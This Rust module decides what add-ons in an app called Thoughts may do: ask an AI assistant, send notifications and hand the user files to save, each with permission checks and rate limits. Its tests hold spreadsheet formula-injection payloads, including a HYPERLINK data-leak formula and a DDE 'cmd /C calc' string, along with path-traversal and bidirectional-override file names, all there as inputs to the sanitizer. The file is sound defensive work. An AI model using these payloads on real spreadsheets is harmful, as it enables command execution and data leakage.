//! What an add-on may do beyond its own frame, decided here and not by the page that hosts it:
//! which folders it may read (FEAT-44), handing the user a file to save (FEAT-43), a notification
//! (FEAT-58) and a question for the assistant whose answer it gets back (FEAT-48).
//!
//! Every check reads the add-on's own declaration from the layer itself (`plugins/<name>.json`,
//! else `manifest.json`): the kept layer, or — while a change is only being tried — the staged
//! copy. The app window says which add-on is asking; what that add-on may do is never taken from
//! the request.

use crate::api::ApiErr;
use crate::applayer::{self, Dirs};
use crate::state::AppState;
use axum::extract::State;
use axum::routing::post;
use axum::{Json, Router};
use serde::Deserialize;
use serde_json::{json, Value};
use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex, OnceLock};

type S = State<Arc<AppState>>;
type R = Result<Json<Value>, ApiErr>;

pub fn routes() -> Router<Arc<AppState>> {
    Router::new()
        .route("/api/layer/addon/ask", post(ask))
        .route("/api/layer/addon/notify", post(notify))
        .route("/api/layer/addon/file", post(file).layer(axum::extract::DefaultBodyLimit::max(FILE_MAX_BYTES * 2 + 4096)))
}

// ---------- the add-on's own declaration ----------

/// The declaration of add-on `name` (a plugin, or with `view` a page), as resolved from `dir`'s
/// layer: `None` when there is no such add-on there, its name is not a plain file name, or it was
/// made for a newer app (then it never runs).
pub fn decl_in(dir: &std::path::Path, name: &str, view: bool) -> Option<Value> {
    let (sub, ext) = if view { ("views", ".html") } else { ("plugins", ".js") };
    if !crate::layer_api::valid_plugin_name(name) || !name.ends_with(ext) { return None; }
    if !std::fs::symlink_metadata(dir.join(sub).join(name)).map_or(false, |m| m.is_file()) { return None; }
    let shared = std::fs::read_to_string(dir.join("manifest.json")).ok().and_then(|t| serde_json::from_str::<Value>(&t).ok()).unwrap_or(Value::Null);
    Some(applayer::resolve_decl(dir, sub, name, &shared, false)).filter(|d| d["unsupported"] != true)
}

/// The layer an add-on of this request runs from: the kept one, or the staged one while it is tried.
fn layer_dir(d: &Dirs, preview: bool) -> &std::path::Path { if preview { &d.staging } else { &d.layer } }

/// The folders an add-on may read in, from its declaration (`decl_in`): `None` = no limit (it lists
/// no `read` folders: the whole library but private folders); `Some(list)` = only inside those;
/// `Some([])` = nothing at all (no such add-on in that layer, or a `read` list with no usable folder).
pub fn reads_of(decl: Option<&Value>) -> Option<Vec<String>> {
    let Some(d) = decl else { return Some(vec![]) };
    let read: Vec<String> = d["read"].as_array().into_iter().flatten().filter_map(Value::as_str).map(String::from).collect();
    if read.is_empty() && d["readsNothing"] != true { None } else { Some(read) }
}

/// The `read` folders of the add-on a `scope=plugin` request is made for (`plugin=<file>`, with
/// `kind=view` for a page and `preview=1` while a change is tried). No add-on named: no limit
/// beyond private folders, as before add-ons could list folders.
pub fn reads(q: &HashMap<String, String>) -> Option<Vec<String>> {
    let name = q.get("plugin")?;
    let view = q.get("kind").map(String::as_str) == Some("view");
    let preview = q.get("preview").map_or(false, |v| v == "1");
    reads_of(decl_in(layer_dir(&Dirs::real(), preview), name, view).as_ref())
}

/// Add-on `name`'s declaration when it grants `perm`; otherwise the plain "was not given
/// permission" refusal.
fn granted(dir: &std::path::Path, name: &str, perm: &str) -> anyhow::Result<Value> {
    decl_in(dir, name, false)
        .filter(|d| d["permissions"].as_array().map_or(false, |a| a.iter().any(|p| p == perm)))
        .ok_or_else(|| crate::tr::err("addon.permission", &[("name", &short(name))]))
}

/// An add-on's name as people see it: its file name without the ending.
fn short(name: &str) -> String { name.trim_end_matches(".js").trim_end_matches(".html").chars().take(60).collect() }

/// One line of an add-on's own text, with nothing in it that would not show on screen.
fn one_line(text: &str, max: usize) -> String {
    let flat: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
    crate::staging::validate::show_hidden(&flat.chars().take(max).collect::<String>(), false)
}

// ---------- how often ----------

/// When each add-on last did what (`ask:<name>`, `notify:<name>`), as Unix seconds. Kept while the
/// service runs.
fn log() -> &'static Mutex<HashMap<String, Vec<i64>>> {
    static LOG: OnceLock<Mutex<HashMap<String, Vec<i64>>>> = OnceLock::new();
    LOG.get_or_init(Default::default)
}

/// How many times `key` happened in the last `within` seconds before `now`.
fn count(key: &str, now: i64, within: i64) -> usize {
    log().lock().unwrap_or_else(|e| e.into_inner()).get(key).map_or(0, |l| l.iter().filter(|t| now - **t < within).count())
}

fn note(key: &str, now: i64) {
    let mut l = log().lock().unwrap_or_else(|e| e.into_inner());
    let list = l.entry(key.to_string()).or_default();
    list.retain(|t| now - *t < 86_400);
    list.push(now);
}

// ---------- asking the assistant (FEAT-48) ----------

/// Questions one add-on may ask in an hour, and in a day.
pub const ASKS_PER_HOUR: usize = 20;
pub const ASKS_PER_DAY: usize = 100;
/// The longest question (with whatever text the add-on puts in it).
pub const ASK_MAX_CHARS: usize = 40_000;

/// What the assistant is told around an add-on's question. It answers with no tools: it sees only
/// what the add-on sent, so asking never lets an add-on learn more of the library than it can read.
fn ask_prompt(name: &str, question: &str) -> String {
    format!("A small add-on of the user's Thoughts app (\"{}\") shows your answer inside its own box. You have no tools and cannot open any file: answer only from what is written between the markers below, and say so plainly when that is not enough. Write plain text without Markdown headings, as briefly as the question allows.\n\n<<<QUESTION\n{question}\nQUESTION>>>", short(name))
}

#[derive(Deserialize, Default)]
#[serde(default)]
struct AskReq { plugin: String, preview: bool, question: String }

/// Add-ons waiting for an answer right now (one question at a time each).
fn asking() -> &'static Mutex<HashSet<String>> {
    static SET: OnceLock<Mutex<HashSet<String>>> = OnceLock::new();
    SET.get_or_init(Default::default)
}

/// An add-on's place in `asking`, given up however the question ends (also when the request is
/// dropped half-way because the window went away).
struct Asking(String);
impl Drop for Asking {
    fn drop(&mut self) { asking().lock().unwrap_or_else(|e| e.into_inner()).remove(&self.0); }
}

/// `POST /api/layer/addon/ask {plugin, question}` → `{text}`: the assistant's answer to an add-on's
/// question. Only a kept add-on that declares `assistant:ask`; one question at a time, at most
/// `ASKS_PER_HOUR` an hour and `ASKS_PER_DAY` a day per add-on, never once the month's spending
/// limit is reached. (The app window lets an add-on ask only right after the person pressed
/// something of its own.)
async fn ask(State(st): S, Json(r): Json<AskReq>) -> R {
    Ok(Json(json!({"text": ask_in(&st, &Dirs::real(), &r.plugin, r.preview, &r.question).await?})))
}

pub async fn ask_in(st: &AppState, d: &Dirs, plugin: &str, preview: bool, question: &str) -> anyhow::Result<String> {
    // Never for a change that is only being tried: it was not kept, and a question costs money.
    if preview { return Err(crate::tr::err("addon.permission", &[("name", &short(plugin))])); }
    granted(&d.layer, plugin, "assistant:ask")?;
    let name = short(plugin);
    let question = question.trim();
    if question.is_empty() { return Err(crate::tr::err("addon.ask_empty", &[])); }
    if question.chars().count() > ASK_MAX_CHARS { return Err(crate::tr::err("addon.ask_long", &[("n", &ASK_MAX_CHARS.to_string())])); }
    if crate::spend::reached(st).await { return Err(crate::tr::err("addon.ask_spend", &[])); }
    if crate::spend::plan_limit_json(st)["reached"] == true { return Err(crate::tr::err("plan.limit_unknown", &[])); }
    let key = format!("ask:{plugin}");
    let now = chrono::Utc::now().timestamp();
    {
        let mut busy = asking().lock().unwrap_or_else(|e| e.into_inner());
        if busy.contains(plugin) { return Err(crate::tr::err("addon.ask_busy", &[("name", &name)])); }
        if count(&key, now, 3600) >= ASKS_PER_HOUR { return Err(crate::tr::err("addon.ask_hour", &[("name", &name), ("n", &ASKS_PER_HOUR.to_string())])); }
        if count(&key, now, 86_400) >= ASKS_PER_DAY { return Err(crate::tr::err("addon.ask_day", &[("name", &name), ("n", &ASKS_PER_DAY.to_string())])); }
        // Counted when asked: a question that fails may still have cost something.
        note(&key, now);
        busy.insert(plugin.to_string());
    }
    let waiting = Asking(plugin.to_string());
    let model = crate::claude::background_model(&st.settings.read().await.ai.claude);
    let answer = crate::claude::complete(st, &ask_prompt(plugin, question), model).await;
    drop(waiting);
    crate::spend::after_cost(st).await;
    crate::log::info(format!("add-on {name} asked the assistant ({})", if answer.is_ok() { "answered" } else { "no answer" }));
    answer
}

// ---------- notifications (FEAT-58) ----------

/// At most one notification per add-on in this many seconds, and `NOTES_PER_HOUR` an hour.
const NOTE_GAP_SECS: i64 = 20;
const NOTES_PER_HOUR: usize = 10;

#[derive(Deserialize, Default)]
#[serde(default)]
struct NotifyReq { plugin: String, preview: bool, text: String }

/// `POST /api/layer/addon/notify {plugin, text}`: a notice under the add-on's name — in the app, and
/// as a system notification when the window is in the background and notifications are on (the
/// app's own `notify` event). Only an add-on that declares `notify`, not too often.
async fn notify(State(st): S, Json(r): Json<NotifyReq>) -> R {
    let (title, body) = notice(&Dirs::real(), &r.plugin, r.preview, &r.text, chrono::Utc::now().timestamp())?;
    st.notify(&title, &body);
    Ok(Json(json!({"ok": true})))
}

/// The notification's `(title, body)` after every check, noted as sent.
pub fn notice(d: &Dirs, plugin: &str, preview: bool, text: &str, now: i64) -> anyhow::Result<(String, String)> {
    granted(layer_dir(d, preview), plugin, "notify")?;
    let name = short(plugin);
    let body = one_line(text, 200);
    if body.is_empty() { return Err(crate::tr::err("addon.notify_empty", &[])); }
    let key = format!("notify:{plugin}");
    if count(&key, now, NOTE_GAP_SECS) > 0 || count(&key, now, 3600) >= NOTES_PER_HOUR { return Err(crate::tr::err("addon.notify_often", &[("name", &name)])); }
    note(&key, now);
    Ok((crate::tr::text("addon.notify_title", &[("name", &name)]), body))
}

// ---------- handing the user a file (FEAT-43) ----------

/// The largest file an add-on may hand over.
pub const FILE_MAX_BYTES: usize = 5 * 1024 * 1024;
/// The kinds of file an add-on may hand over: plain text that opens without running anything.
pub const FILE_KINDS: &[&str] = &["csv", "txt", "md", "json"];

#[derive(Deserialize, Default)]
#[serde(default)]
struct FileReq { plugin: String, preview: bool, name: String, content: String }

/// `POST /api/layer/addon/file {plugin, name, content}` → `{name, content}`: the file as the app
/// will offer it in the save dialog (the person picks where; nothing is saved here). Only an add-on
/// that declares `files:save`; see `clean_file` for what is changed in it.
async fn file(Json(r): Json<FileReq>) -> R {
    granted(layer_dir(&Dirs::real(), r.preview), &r.plugin, "files:save")?;
    let (name, content) = clean_file(&r.name, &r.content)?;
    Ok(Json(json!({"name": name, "content": content})))
}

/// The name and text an add-on's file is handed over with. The name is a plain file name ending in
/// one of `FILE_KINDS`. Nothing in the text may reach the internet when the file is opened: a
/// spreadsheet cell that would be a formula is written as text (`csv_as_text`), and in Markdown
/// pictures become plain links and HTML tags show as text (`md_as_text`).
pub fn clean_file(name: &str, content: &str) -> anyhow::Result<(String, String)> {
    let base = name.rsplit(['/', '\\']).next().unwrap_or("").trim();
    let (stem, ext) = base.rsplit_once('.').map(|(s, e)| (s, e.to_lowercase())).unwrap_or((base, String::new()));
    if !FILE_KINDS.contains(&ext.as_str()) { return Err(crate::tr::err("addon.file_type", &[])); }
    let stem: String = stem.chars().filter(|c| !c.is_control() && !crate::staging::validate::is_hidden_char(*c) && !"/\\:*?\"<>|".contains(*c)).collect();
    let stem: String = stem.trim().trim_matches('.').trim().chars().take(80).collect();
    if stem.is_empty() { return Err(crate::tr::err("addon.file_name", &[])); }
    if content.len() > FILE_MAX_BYTES { return Err(crate::tr::err("addon.file_large", &[])); }
    let text = match ext.as_str() { "csv" => csv_as_text(content), "md" => md_as_text(content), _ => content.to_string() };
    Ok((format!("{}.{ext}", stem.trim()), text))
}

/// A spreadsheet takes a cell that starts with `=`, `+`, `-` or `@` for a formula, and a formula can
/// fetch an internet address with the sheet's contents in it. Such a cell gets a `'` in front, which
/// spreadsheets show as text. Plain numbers (`-12.5`, `+966 55 123 4567`) stay as they are. Cells are
/// taken to start at the start of a line and after every comma, semicolon or tab (spreadsheets in
/// some languages split on semicolons), inside quotes too: a stray `'` in a text is the safe side.
pub fn csv_as_text(csv: &str) -> String {
    let chars: Vec<char> = csv.chars().collect();
    let mut out = String::with_capacity(csv.len() + 16);
    let (mut i, mut start) = (0, true);
    while i < chars.len() {
        let c = chars[i];
        if start {
            if c == '\u{feff}' && i == 0 { out.push(c); i += 1; continue; }
            start = false;
            let at = if c == '"' { i + 1 } else { i };
            if formula(&chars[at.min(chars.len())..]) {
                if c == '"' { out.push('"'); }
                out.push('\'');
                i = at;
                continue;
            }
        }
        out.push(c);
        if matches!(c, ',' | ';' | '\t' | '\n' | '\r') { start = true; }
        i += 1;
    }
    out
}

/// Would a spreadsheet read the cell beginning here as a formula?
fn formula(cell: &[char]) -> bool {
    match cell.first() {
        Some('=' | '@') => true,
        Some('+' | '-') => !cell[1..].iter().take_while(|c| !matches!(c, ',' | ';' | '\t' | '\n' | '\r' | '"'))
            .all(|c| c.is_ascii_digit() || matches!(c, '.' | ' ' | '%')),
        _ => false,
    }
}

/// Markdown that opens without fetching anything: `![…](…)` pictures become links, and the start of
/// an HTML tag (`<img`, `</div>`, `<!--`) is written as `&lt;`, so it shows as text.
pub fn md_as_text(md: &str) -> String {
    let mut out = String::with_capacity(md.len());
    let mut it = md.chars().peekable();
    while let Some(c) = it.next() {
        match c {
            '!' if it.peek() == Some(&'[') => {}
            '<' if it.peek().map_or(false, |n| n.is_ascii_alphabetic() || matches!(n, '/' | '!' | '?')) => out.push_str("&lt;"),
            _ => out.push(c),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn layer(tag: &str) -> Dirs {
        let home = std::env::temp_dir().join(format!("thoughts-addons-{tag}-{}", uuid::Uuid::new_v4()));
        let d = Dirs::at(&home);
        for dir in [&d.layer, &d.staging] {
            std::fs::create_dir_all(dir.join("plugins")).unwrap();
            std::fs::create_dir_all(dir.join("views")).unwrap();
        }
        d
    }
    fn put(dir: &std::path::Path, rel: &str, text: &str) { std::fs::write(dir.join(rel), text).unwrap(); }

    #[test]
    fn the_folders_an_add_on_reads_come_from_its_own_declaration() {
        let d = layer("reads");
        put(&d.layer, "plugins/intake.js", "export default () => {}\n");
        put(&d.layer, "plugins/intake.json", r#"{"apiVersion":1,"permissions":["library:read"],"read":["clients/","../x"]}"#);
        put(&d.layer, "plugins/all.js", "export default () => {}\n");
        put(&d.layer, "plugins/all.json", r#"{"apiVersion":1,"permissions":["library:read"]}"#);
        put(&d.layer, "plugins/broken.js", "export default () => {}\n");
        put(&d.layer, "plugins/broken.json", r#"{"apiVersion":1,"permissions":["library:read"],"read":["../x"]}"#);
        put(&d.layer, "views/cal.html", "<p>cal</p>");
        put(&d.layer, "views/cal.json", r#"{"apiVersion":1,"permissions":["todos:read"],"read":["work"]}"#);
        put(&d.staging, "plugins/intake.js", "export default () => {}\n");
        put(&d.staging, "plugins/intake.json", r#"{"apiVersion":1,"permissions":["library:read"],"read":["clients","notes"]}"#);
        let of = |dir: &std::path::Path, n: &str, view: bool| reads_of(decl_in(dir, n, view).as_ref());
        assert_eq!(of(&d.layer, "intake.js", false), Some(vec!["clients".to_string()]), "a folder that cannot be one is dropped");
        assert_eq!(of(&d.layer, "all.js", false), None, "no list: the whole library but private folders");
        assert_eq!(of(&d.layer, "broken.js", false), Some(vec![]), "a list with nothing usable left reads nothing");
        assert_eq!(of(&d.layer, "cal.html", true), Some(vec!["work".to_string()]), "pages too");
        assert_eq!(of(&d.staging, "intake.js", false), Some(vec!["clients".to_string(), "notes".to_string()]), "while tried: the staged declaration");
        // An add-on that is not there (or not by a plain name, or not of that kind) reads nothing.
        for (n, view) in [("gone.js", false), ("../intake.js", false), ("intake.js", true), ("cal.html", false), ("intake.json", false)] {
            assert_eq!(of(&d.layer, n, view), Some(vec![]), "{n}");
        }
        // Made for a newer app: never runs, reads nothing.
        put(&d.layer, "plugins/new.js", "export default () => {}\n");
        put(&d.layer, "plugins/new.json", r#"{"apiVersion":2,"permissions":["library:read"]}"#);
        assert_eq!(of(&d.layer, "new.js", false), Some(vec![]));
        std::fs::remove_dir_all(&d.home).unwrap();
    }

    #[test]
    fn only_an_add_on_given_the_permission_may_notify_and_not_too_often() {
        let d = layer("notify");
        put(&d.layer, "plugins/timer.js", "export default () => {}\n");
        put(&d.layer, "plugins/timer.json", r#"{"apiVersion":1,"permissions":["notify"]}"#);
        put(&d.layer, "plugins/quiet.js", "export default () => {}\n");
        put(&d.staging, "plugins/quiet.js", "export default () => {}\n");
        put(&d.staging, "plugins/quiet.json", r#"{"apiVersion":1,"permissions":["notify"]}"#);
        let now = 1_000_000;
        let (title, body) = notice(&d, "timer.js", false, "  Time is\nup \u{202E}now ", now).unwrap();
        assert_eq!((title.as_str(), body.as_str()), ("Add-on “timer”", "Time is up [U+202E]now"));
        assert!(notice(&d, "timer.js", false, "again", now + 5).unwrap_err().to_string().contains("too often"));
        assert!(notice(&d, "timer.js", false, "later", now + NOTE_GAP_SECS).is_ok());
        assert!(notice(&d, "timer.js", false, "   ", now + 100).unwrap_err().to_string().contains("no text"));
        // Not declared in the kept layer: refused; declared in the change being tried: only while tried.
        assert!(notice(&d, "quiet.js", false, "hi", now).unwrap_err().to_string().contains("not given permission"));
        assert!(notice(&d, "quiet.js", true, "hi", now).is_ok());
        assert!(notice(&d, "nobody.js", false, "hi", now).is_err());
        // Ten an hour at most.
        let start = now + 10_000;
        for i in 0..NOTES_PER_HOUR as i64 { assert!(notice(&d, "timer.js", false, "x", start + i * NOTE_GAP_SECS).is_ok(), "{i}"); }
        assert!(notice(&d, "timer.js", false, "x", start + 3000).is_err());
        std::fs::remove_dir_all(&d.home).unwrap();
    }

    #[tokio::test]
    async fn an_add_on_asks_the_assistant_only_with_permission_and_within_its_budget() {
        let d = layer("ask");
        put(&d.layer, "plugins/brief.js", "export default () => {}\n");
        put(&d.layer, "plugins/brief.json", r#"{"apiVersion":1,"permissions":["assistant:ask"]}"#);
        put(&d.layer, "plugins/plain.js", "export default () => {}\n");
        put(&d.staging, "plugins/plain.js", "export default () => {}\n");
        put(&d.staging, "plugins/plain.json", r#"{"apiVersion":1,"permissions":["assistant:ask"]}"#);
        let st = AppState::for_test();
        let seen: Arc<Mutex<Vec<String>>> = Default::default();
        let s2 = seen.clone();
        *st.complete_hook.lock().unwrap() = Some(Arc::new(move |prompt: String, _model| {
            s2.lock().unwrap().push(prompt);
            Box::pin(async { Ok("Acme owes two invoices.".to_string()) })
        }));
        let answer = ask_in(&st, &d, "brief.js", false, "  Summarise: Acme, invoices 12 and 14 unpaid ").await.unwrap();
        assert_eq!(answer, "Acme owes two invoices.");
        let prompt = seen.lock().unwrap()[0].clone();
        assert!(prompt.contains("no tools") && prompt.contains("Summarise: Acme, invoices 12 and 14 unpaid") && prompt.contains("\"brief\""), "{prompt}");
        // No permission, only staged, only while tried, unknown: refused, and nothing is asked.
        for (name, preview) in [("plain.js", false), ("plain.js", true), ("brief.js", true), ("x.js", false)] {
            assert!(ask_in(&st, &d, name, preview, "hi").await.unwrap_err().to_string().contains("not given permission"), "{name}");
        }
        assert!(ask_in(&st, &d, "brief.js", false, " ").await.is_err());
        assert!(ask_in(&st, &d, "brief.js", false, &"x".repeat(ASK_MAX_CHARS + 1)).await.unwrap_err().to_string().contains("too long"));
        assert_eq!(seen.lock().unwrap().len(), 1);
        // The hour's budget (the first question counted too).
        for _ in 1..ASKS_PER_HOUR { ask_in(&st, &d, "brief.js", false, "again").await.unwrap(); }
        assert!(ask_in(&st, &d, "brief.js", false, "one more").await.unwrap_err().to_string().contains("in the last hour"));
        assert_eq!(seen.lock().unwrap().len(), ASKS_PER_HOUR);
        std::fs::remove_dir_all(&d.home).unwrap();
    }

    #[tokio::test]
    async fn an_add_on_asks_one_question_at_a_time_and_a_question_that_goes_away_gives_its_place_up() {
        let d = layer("busy");
        put(&d.layer, "plugins/slow.js", "export default () => {}\n");
        put(&d.layer, "plugins/slow.json", r#"{"apiVersion":1,"permissions":["assistant:ask"]}"#);
        let st = AppState::for_test();
        *st.complete_hook.lock().unwrap() = Some(Arc::new(|prompt: String, _model| {
            if prompt.contains("think long") { Box::pin(futures::future::pending()) } else { Box::pin(async { Ok("ok".to_string()) }) }
        }));
        let mut first = Box::pin(ask_in(&st, &d, "slow.js", false, "think long"));
        assert!(futures::poll!(first.as_mut()).is_pending());
        assert!(ask_in(&st, &d, "slow.js", false, "quick").await.unwrap_err().to_string().contains("still waiting"));
        drop(first);
        assert_eq!(ask_in(&st, &d, "slow.js", false, "quick").await.unwrap(), "ok");
        std::fs::remove_dir_all(&d.home).unwrap();
    }

    #[test]
    fn a_file_an_add_on_hands_over_opens_without_reaching_anything() {
        // Only plain text kinds, under a plain name.
        assert_eq!(clean_file("../../hours 2026-11.CSV", "a,b\n").unwrap().0, "hours 2026-11.csv");
        assert_eq!(clean_file("ساعات.md", "").unwrap().0, "ساعات.md");
        for bad in ["report.html", "x.docx", "run.command", "noext", "x.csv.exe", "x.svg"] { assert!(clean_file(bad, "").is_err(), "{bad}"); }
        assert!(clean_file(".csv", "").is_err() && clean_file("\u{202E}.txt", "").is_err());
        assert_eq!(clean_file("a\u{202E}b.txt", "x").unwrap().0, "ab.txt");
        assert!(clean_file("big.txt", &"x".repeat(FILE_MAX_BYTES + 1)).is_err());
        // Spreadsheet formulas become text; numbers and ordinary text stay.
        let csv = "\u{feff}=HYPERLINK(\"https://x?\"&A2),-12.5,+966 55 123 4567\n\"=1+1\";@SUM(A1);-cmd|' /C calc'!A0\nname,\"Smith, Jones\",- ,ok\t=2";
        assert_eq!(csv_as_text(csv), "\u{feff}'=HYPERLINK(\"https://x?\"&A2),-12.5,+966 55 123 4567\n\"'=1+1\";'@SUM(A1);'-cmd|' /C calc'!A0\nname,\"Smith, Jones\",- ,ok\t'=2");
        assert_eq!(clean_file("x.csv", "=1").unwrap().1, "'=1");
        assert_eq!(clean_file("x.txt", "=1").unwrap().1, "=1", "only spreadsheets read formulas");
        // Markdown: no pictures from anywhere, no HTML; text, links and comparisons stay.
        assert_eq!(md_as_text("# Hours\n![logo](https://x/p.png?d=1) <img src=x> </b> <!-- c --> a < b, <3 [site](https://x)"),
            "# Hours\n[logo](https://x/p.png?d=1) &lt;img src=x> &lt;/b> &lt;!-- c --> a < b, <3 [site](https://x)");
        assert_eq!(clean_file("x.json", "{\"a\":\"<b>\"}").unwrap().1, "{\"a\":\"<b>\"}");
    }
}
